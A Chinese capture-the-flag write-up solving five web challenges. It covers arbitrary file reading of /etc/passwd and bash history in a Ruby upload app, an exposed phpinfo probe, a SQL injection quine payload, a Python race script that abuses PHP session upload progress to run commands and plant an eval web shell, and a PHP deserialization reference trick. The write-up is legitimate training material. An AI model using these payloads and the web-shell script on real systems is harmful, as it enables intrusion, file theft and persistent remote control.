

# PNG图片转换器

```ruby
require 'sinatra'
require 'digest'
require 'base64'

get '/' do
  open("./view/index.html", 'r').read()
end

get '/upload' do
  open("./view/upload.html", 'r').read()
end

post '/upload' do
  unless params[:file] && params[:file][:tempfile] && params[:file][:filename] && params[:file][:filename].split('.')[-1] == 'png'
    return "<script>alert('error');location.href='/upload';</script>"
  end
  begin
    filename = Digest::MD5.hexdigest(Time.now.to_i.to_s + params[:file][:filename]) + '.png'
    open(filename, 'wb') { |f|
      f.write open(params[:file][:tempfile],'r').read()
    }
    "Upload success, file stored at #{filename}"
  rescue
    'something wrong'
  end

end

get '/convert' do
  open("./view/convert.html", 'r').read()
end

post '/convert' do
  begin
    unless params['file']
      return "<script>alert('error');location.href='/convert';</script>"
    end

    file = params['file']
    unless file.index('..') == nil && file.index('/') == nil && file =~ /^(.+)\.png$/
      return "<script>alert('dont hack me');</script>"
    end
    res = open(file, 'r').read()
    headers 'Content-Type' => "text/html; charset=utf-8"
    "var img = document.createElement(\"img\");\nimg.src= \"data:image/png;base64," + Base64.encode64(res).gsub(/\s*/, '') + "\";\n"
  rescue
    'something wrong'
  end
end
```

和PHP不一样的就是这里：

```ruby
  unless params[:file] && params[:file][:tempfile] && params[:file][:filename] && params[:file][:filename].split('.')[-1] == 'png'
    return "<script>alert('error');location.href='/upload';</script>"
  end
  begin
    filename = Digest::MD5.hexdigest(Time.now.to_i.to_s + params[:file][:filename]) + '.png'
    open(filename, 'wb') { |f|
      f.write open(params[:file][:tempfile],'r').read()
    }
```

`tempfile`是我们可控的，因此存在任意文件读取。

先读/etc/passwd：

```
http://114.115.128.215:32770/upload

file[tempfile]=/etc/passwd&file[filename]=2.png
```

然后利用`/convert`去获取内容即可，发现最后有个test用户：/home/test

去读`/home/test/.bash_history`：

```
<head>
<title>Error response</title>
</head>
<body>
<h1>Error response</h1>
<p>Error code 400.
<p>Message: Bad request syntax ('bash: cannot set terminal process group (82): Inappropriate ioctl for device').
<p>Error code explanation: 400 = Bad request syntax or unsupported method.
</body>
ls
ls /
ls -al
ls -al /
cat FLA9_KywXAv78LbopbpBDuWsm
ls
cd /
ls
cat FLA9_KywXAv78LbopbpBDuWsm
ls /
cat /F*
ps aux
w
last
ps aux|grep sh
netstat -tunlp
ls
ls -lha
ls
exit

```

找到flag位置，再读`/FLA9_KywXAv78LbopbpBDuWsm`即可。



# WebFTP

试了一下admin,admin888登录不上去。去github把源码拖下来看了一下也看不出啥，也没弱密码，很懵。

后来看到`Readme`目录下有个`mytz.php`，是个php探针，但是很多操作都点不了。去看了一下源码，看到了这个：

```php
if (isset($_GET['act']) && $_GET['act'] == 'phpinfo'){
	phpinfo();
	exit();
}elseif(isset($_POST['act']) && $_POST['act'] == 'TEST_1'){
	$valInt = test_int();
}elseif(isset($_POST['act']) && $_POST['act'] == 'TEST_2'){
	$valFloat = test_float();
}elseif(isset($_POST['act']) && $_POST['act'] == 'TEST_3'){
	$valIo = test_io();
}elseif(isset($_POST['act']) && $_POST['act'] == '连接MySQL'){
```

试试了一下phpinfo，果然flag这个环境变量在phpinfo中。。。

```
http://114.115.185.167:32770/Readme/mytz.php?act=phpinfo
```



# yet_another_mysql_injection

参考文章：

https://www.shysecurity.com/post/20140705-SQLi-Quine

14年的题目了。。。不过还是挺有意思的。

payload:

```
username=admin&password='%2F**%2Funion%2F**%2FSELECT%2F**%2FREPLACE(REPLACE('%22%2F**%2Funion%2F**%2FSELECT%2F**%2FREPLACE(REPLACE(%22%3F%22%2CCHAR(34)%2CCHAR(39))%2CCHAR(63)%2C%22%3F%22)%23'%2CCHAR(34)%2CCHAR(39))%2CCHAR(63)%2C'%22%2F**%2Funion%2F**%2FSELECT%2F**%2FREPLACE(REPLACE(%22%3F%22%2CCHAR(34)%2CCHAR(39))%2CCHAR(63)%2C%22%3F%22)%23')%23
```

url编码一次即可。

# EasyCleanup

```php
<?php

if(!isset($_GET['mode'])){
    highlight_file(__file__);
}else if($_GET['mode'] == "eval"){
    $shell = $_GET['shell'] ?? 'phpinfo();';
    if(strlen($shell) > 15 | filter($shell) | checkNums($shell)) exit("hacker");
    eval($shell);
}


if(isset($_GET['file'])){
    if(strlen($_GET['file']) > 15 | filter($_GET['file'])) exit("hacker");
    include $_GET['file'];
}


function filter($var): bool{
    $banned = ["while", "for", "\$_", "include", "env", "require", "?", ":", "^", "+", "-", "%", "*", "`"];

    foreach($banned as $ban){
        if(strstr($var, $ban)) return True;
    }

    return False;
}

function checkNums($var): bool{
    $alphanum = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $cnt = 0;
    for($i = 0; $i < strlen($alphanum); $i++){
        for($j = 0; $j < strlen($var); $j++){
            if($var[$j] == $alphanum[$i]){
                $cnt += 1;
                if($cnt > 8) return True;
            }
        }
    }
    return False;
}

?>
```

很明显的session。。。。没啥好说的。。。：

```python
import io
import sys
import requests
import threading

host = 'http://114.115.134.72:32770/'
sessid = 'feng'

def POST(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        session.post(
            host,
            data={"PHP_SESSION_UPLOAD_PROGRESS":"<?php system('cat /*');fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd])?>');echo md5('1');?>"},
            files={"file":('a.txt', f)},
            cookies={'PHPSESSID':sessid}
        )

def READ(session):
    while True:
        response = session.get(f'{host}?file=/tmp/sess_{sessid}')
        print(response.text)
        if 'c4ca4238a0b923820dcc509a6f75849b' not in response.text:
            print('[+++]retry')
        else:
            print(response.text)
            sys.exit(0)


with requests.session() as session:
    t1 = threading.Thread(target=POST, args=(session, ))
    t1.daemon = True
    t1.start()
    READ(session)


```





# pklovecloud

唯一的考点：

```php
if($this->openstack->neutron === $this->openstack->nova)
```

利用`&`，很老的考点了：

```php

{
    public $filename;
    public $openstack;
    public $docker;
    function __construct()
    {
        $this->filename = 'flag.php';
        $b = new acp();
        $this->docker = serialize($b);
    }
    function echo_name()
    {
        $this->openstack = unserialize($this->docker);
        $this->openstack->neutron = $heat;
        if($this->openstack->neutron === $this->openstack->nova)
        {
            $file = "./{$this->filename}";
            if (file_get_contents($file))
            {
                return file_get_contents($file);
            }
            else
            {
                return "keystone lost~";
            }
        }
    }
}

$a = new acp();
$a->set();
echo urlencode(serialize($a));
```

